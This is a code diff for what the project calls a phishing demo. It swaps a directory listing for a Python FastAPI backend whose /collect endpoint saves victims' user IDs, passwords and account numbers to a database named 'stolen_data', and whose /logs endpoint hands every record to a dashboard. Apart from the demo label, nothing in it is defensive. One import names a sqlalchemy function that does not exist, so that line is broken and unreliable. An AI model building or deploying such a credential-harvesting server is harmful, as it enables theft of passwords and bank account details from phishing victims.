@@ -1,25 +1,56 @@
-phishing-demo-backend/
-│
-├── README.md
-├── .gitignore
-├── package.json
-├── server.js
-│
-├── config/
-│   └── db.js
-│
-├── models/
-│   └── Log.js
-│
-├── routes/
-│   └── apiRoutes.js
-│
-├── ai/
-│   └── urlRiskAnalyzer.js
-│
-├── utils/
-│   ├── geoip.js
-│   └── qrGenerator.js
-│
-└── socket/
-    └── socket.js
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
+from sqlalchemy import create_all_engines, Column, Integer, String, DateTime
+from sqlalchemy.ext.declarative import declarative_base
+from sqlalchemy.orm import sessionmaker
+import datetime
+
+# --- DB 설정 ---
+DATABASE_URL = "sqlite:///./stolen_data.db"
+Base = declarative_base()
+
+class StolenInfo(Base):
+    __tablename__ = "credentials"
+    id = Column(Integer, primary_key=True, index=True)
+    user_id = Column(String)
+    password = Column(String)
+    account_number = Column(String, nullable=True)
+    timestamp = Column(DateTime, default=datetime.datetime.utcnow)
+
+from sqlalchemy import create_engine
+engine = create_engine(DATABASE_URL)
+SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
+Base.metadata.create_all(bind=engine)
+
+# --- FastAPI 앱 설정 ---
+app = FastAPI()
+
+# 데이터 입력을 위한 스키마
+class InfoCreate(BaseModel):
+    user_id: str
+    password: str
+    account_number: str = None
+
+# [POST] 팀원 1로부터 데이터를 받는 API
+@app.post("/collect")
+async def collect_data(info: InfoCreate):
+    db = SessionLocal()
+    new_data = StolenInfo(
+        user_id=info.user_id, 
+        password=info.password, 
+        account_number=info.account_number
+    )
+    db.add(new_data)
+    db.commit()
+    db.refresh(new_data)
+    db.close()
+    return {"status": "success", "message": "Data logged safely."}
+
+# [GET] 팀원 4(대시보드)가 데이터를 가져가는 API
+@app.get("/logs")
+async def get_logs():
+    db = SessionLocal()
+    # 최신 순으로 전체 로그 반환
+    logs = db.query(StolenInfo).order_by(StolenInfo.timestamp.desc()).all()
+    db.close()
+    return logs
